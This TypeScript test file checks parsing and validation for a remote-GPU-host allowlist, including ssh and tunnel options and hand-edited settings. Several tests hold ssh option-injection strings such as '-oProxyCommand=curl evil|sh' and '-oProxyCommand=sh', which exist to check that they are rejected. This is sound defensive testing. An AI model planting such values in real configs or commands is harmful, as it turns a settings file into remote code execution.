/**
 * remote-hosts-store.test.ts — parsing what the user typed, and surviving what they hand-edited.
 *
 * The allowlist is a security control, so the failure mode matters: a corrupt value must yield
 * an EMPTY list (costing access) rather than a partially-trusted one (costing safety).
 */
import assert from "node:assert/strict";
import { test } from "node:test";

import {
  parseRemoteArgs,
  parseRemoteHosts,
  removeRemoteHost,
  upsertRemoteHost,
} from "./remote-hosts-store.js";

const GIB = 1024 ** 3;

test("a bare hostname becomes the ollama default URL — the user should not have to spell it", () => {
  const r = parseRemoteArgs("gpu-box.lan");
  assert.equal(r.ok, true);
  if (!r.ok) return;
  assert.equal(r.entry.host, "gpu-box.lan");
  assert.equal(r.entry.baseUrl, "http://gpu-box.lan:11434/v1");
  assert.equal(r.entry.totalMemoryBytes, undefined);
});

test("an explicit URL is kept verbatim, and --ram/--label are read", () => {
  const r = parseRemoteArgs("https://gpu.example.com:8443/v1 --ram 128 --label workshop");
  assert.equal(r.ok, true);
  if (!r.ok) return;
  assert.equal(r.entry.baseUrl, "https://gpu.example.com:8443/v1");
  assert.equal(r.entry.host, "gpu.example.com");
  assert.equal(r.entry.totalMemoryBytes, 128 * GIB);
  assert.equal(r.entry.label, "workshop");
});

test("bad arguments are refused with a usable message", () => {
  for (const [args, re] of [
    ["", /usage: \/remote add/],
    ["host --ram", /--ram needs a size/],
    ["host --ram -4", /--ram needs a size/],
    ["host --label", /--label needs a value/],
    ["host --wat", /unknown option --wat/],
    ["a.lan b.lan", /one URL at a time/],
  ] as const) {
    const r = parseRemoteArgs(args);
    assert.equal(r.ok, false, args);
    assert.match(r.ok === false ? r.error : "", re, args);
  }
});

test("a corrupt stored value yields an EMPTY list, never a partial one", () => {
  // Losing the allowlist costs access. Keeping half of a corrupt one could cost safety.
  assert.deepEqual(parseRemoteHosts("not json"), []);
  assert.deepEqual(parseRemoteHosts('{"host":"x"}'), [], "an object is not a list");
  assert.deepEqual(parseRemoteHosts(""), []);
  assert.deepEqual(parseRemoteHosts(undefined), []);
  assert.deepEqual(parseRemoteHosts(42), []);
});

test("rows missing host or baseUrl are dropped, not defaulted", () => {
  const rows = parseRemoteHosts(
    JSON.stringify([
      { host: "a.lan", baseUrl: "http://a.lan:11434" },
      { host: "b.lan" },
      { baseUrl: "http://c.lan" },
      { host: "  ", baseUrl: "http://d.lan" },
      { host: "E.LAN.", baseUrl: "http://e.lan:11434", totalMemoryBytes: 64 * 1024 ** 3 },
    ]),
  );
  assert.deepEqual(
    rows.map((r) => r.host),
    ["a.lan", "e.lan"],
    "and the name is normalised",
  );
  assert.equal(rows[1]?.totalMemoryBytes, 64 * 1024 ** 3);
});

test("a non-positive memory size is ignored rather than trusted", () => {
  const [row] = parseRemoteHosts(
    JSON.stringify([{ host: "a.lan", baseUrl: "http://a.lan", totalMemoryBytes: 0 }]),
  );
  assert.equal(row?.totalMemoryBytes, undefined, "0 bytes would refuse every model");
});

test("upsert replaces by normalised host, never duplicates", () => {
  const first = upsertRemoteHost({ host: "GPU-Box.LAN", baseUrl: "http://a" }, []);
  assert.equal(first.length, 1);
  assert.equal(first[0]?.host, "gpu-box.lan");
  const second = upsertRemoteHost({ host: "gpu-box.lan", baseUrl: "http://b" }, first);
  assert.equal(second.length, 1, "same host ⇒ replaced");
  assert.equal(second[0]?.baseUrl, "http://b");
});

test("remove reports whether anything was actually removed", () => {
  const list = [{ host: "a.lan", baseUrl: "http://a" }];
  const hit = removeRemoteHost("A.LAN", list);
  assert.equal(hit.removed, true);
  assert.deepEqual(hit.hosts, []);
  const miss = removeRemoteHost("z.lan", list);
  assert.equal(miss.removed, false);
  assert.equal(miss.hosts.length, 1);
});

/* ────────────────────────────────────────────────────────────────────────────
 * 2026-09-25: ssh, tunnels, and the fact that a settings file is untrusted input.
 * ──────────────────────────────────────────────────────────────────────────── */

test("--ssh with no value inherits the host from the URL", () => {
  const r = parseRemoteArgs("gpu-box.lan --ssh");
  assert.equal(r.ok, true);
  if (!r.ok) return;
  // Typing the same name twice is a papercut, and a mismatch between the two would be a bug
  // the user could not see.
  assert.deepEqual(r.entry.ssh, { host: "gpu-box.lan" });
});

test("--ssh takes a full user@host:port", () => {
  const r = parseRemoteArgs("gpu-box.lan --ssh phoenix@gpu-box.lan:2222 --identity /k/id_ed25519");
  assert.equal(r.ok, true);
  if (!r.ok) return;
  assert.deepEqual(r.entry.ssh, {
    host: "gpu-box.lan",
    user: "phoenix",
    port: 2222,
    identityFile: "/k/id_ed25519",
  });
});

test("a hostile --ssh value is refused at parse time, not at spawn time", () => {
  const r = parseRemoteArgs("gpu-box.lan --ssh -oProxyCommand=sh");
  assert.equal(r.ok, false);
  if (r.ok) return;
  assert.match(r.error, /--ssh/);
});

test("--tunnel defaults to the port already given in the URL", () => {
  const r = parseRemoteArgs("http://gpu-box.lan:1234/v1 --ssh --tunnel");
  assert.equal(r.ok, true);
  if (!r.ok) return;
  // Asking for the port twice and then punishing a mismatch would be asking the user to repeat
  // themselves for no reason.
  assert.deepEqual(r.entry.tunnel, { remotePort: 1234 });
});

test("--tunnel can name its own remote port", () => {
  const r = parseRemoteArgs("gpu-box.lan --ssh --tunnel 11500");
  assert.equal(r.ok, true);
  if (!r.ok) return;
  assert.deepEqual(r.entry.tunnel, { remotePort: 11500 });
});

test("--tunnel without --ssh is refused, because the tunnel IS the ssh connection", () => {
  const r = parseRemoteArgs("gpu-box.lan --tunnel");
  assert.equal(r.ok, false);
  if (r.ok) return;
  assert.match(r.error, /--tunnel needs --ssh/);
});

test("--identity and --trust-new without --ssh are refused rather than silently ignored", () => {
  assert.equal(parseRemoteArgs("gpu-box.lan --identity /k").ok, false);
  assert.equal(parseRemoteArgs("gpu-box.lan --trust-new").ok, false);
});

test("a hand-edited settings file cannot smuggle an ssh option through the ssh block", () => {
  // The settings file is plain JSON the user can edit, and this block becomes argv for a
  // spawn. Trusting stored data BECAUSE it is stored is how a config file becomes a
  // code-execution vector, so it goes through the same validator a typed host does.
  const raw = JSON.stringify([
    {
      host: "gpu-box.lan",
      baseUrl: "http://gpu-box.lan:11434/v1",
      ssh: { host: "-oProxyCommand=curl evil|sh" },
    },
  ]);
  const hosts = parseRemoteHosts(raw);
  assert.equal(hosts.length, 1, "the host itself is still usable over plain http");
  assert.equal(hosts[0]?.ssh, undefined, "but the poisoned ssh block is dropped");
});

test("a hand-edited identity path that is an option is dropped too", () => {
  const raw = JSON.stringify([
    {
      host: "b.lan",
      baseUrl: "http://b.lan:11434/v1",
      ssh: { host: "b.lan", identityFile: "-oProxyCommand=sh" },
    },
  ]);
  assert.equal(parseRemoteHosts(raw)[0]?.ssh, undefined);
});

test("a nonsense tunnel port is dropped, not clamped into something plausible", () => {
  for (const remotePort of [0, -1, 70000, 1.5, "11434"]) {
    const raw = JSON.stringify([
      {
        host: "b.lan",
        baseUrl: "http://b.lan:11434/v1",
        ssh: { host: "b.lan" },
        tunnel: { remotePort },
      },
    ]);
    assert.equal(parseRemoteHosts(raw)[0]?.tunnel, undefined, `port ${remotePort} must be dropped`);
  }
});

test("a valid ssh + tunnel block round-trips through storage", () => {
  const entry = {
    host: "gpu-box.lan",
    baseUrl: "http://gpu-box.lan:11434/v1",
    ssh: { host: "gpu-box.lan", user: "phoenix", port: 2222 },
    tunnel: { remotePort: 11434 },
  };
  const back = parseRemoteHosts(JSON.stringify([entry]));
  assert.deepEqual(back[0]?.ssh, entry.ssh);
  assert.deepEqual(back[0]?.tunnel, entry.tunnel);
});

test("a cached hardware probe survives storage and carries its timestamp", () => {
  const raw = JSON.stringify([
    {
      host: "b.lan",
      baseUrl: "http://b.lan:11434/v1",
      hardware: { gpus: [{ name: "RTX 4090", totalBytes: 100 }], unparsed: [], memTotalBytes: 200 },
      hardwareAt: "2026-09-25T10:00:00.000Z",
    },
  ]);
  const h = parseRemoteHosts(raw)[0];
  assert.equal(h?.hardware?.memTotalBytes, 200);
  assert.equal(h?.hardwareAt, "2026-09-25T10:00:00.000Z");
});
